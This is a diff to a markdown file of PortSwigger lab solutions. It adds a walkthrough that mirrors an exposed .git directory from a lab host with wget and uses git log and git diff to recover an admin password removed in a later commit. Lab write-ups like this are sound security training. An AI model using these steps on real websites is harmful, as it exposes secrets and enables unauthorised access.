@@ -1129,7 +1129,30 @@ curl -k -x 127.0.0.1:8081 $URL/submitSolution -d "answer=$version"
 EOF
 ```
 
-**Mitigation**
+### Lab: Information disclosure in version control history
+
+    https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history
+
+Solution:
+
+```
+wget -r https://0a2c000903f21b5c80b79e2300b600b0.web-security-academy.net/.git
+
+(in repo dir)$ git log
+commit e392ec3935432e72bc32a301563a35f7f067d3cc (HEAD -> master)
+Author: Carlos Montoya <carlos@carlos-montoya.net>
+Date:   Tue Jun 23 14:05:07 2020 +0000
+
+    Remove admin password from config
+
+commit a6518f8970aaee630c0267a1bb197e217e30b7fe
+Author: Carlos Montoya <carlos@carlos-montoya.net>
+Date:   Mon Jun 22 16:23:42 2020 +0000
+
+    Add skeleton admin panel
+
+(in repo dir)$ git diff a6518f8970aaee630c0267a1bb197e217e30b7fe...e392ec3935432e72bc32a301563a35f7f067d3cc
+```
 
 ### Lab: Information disclosure on debug page
 
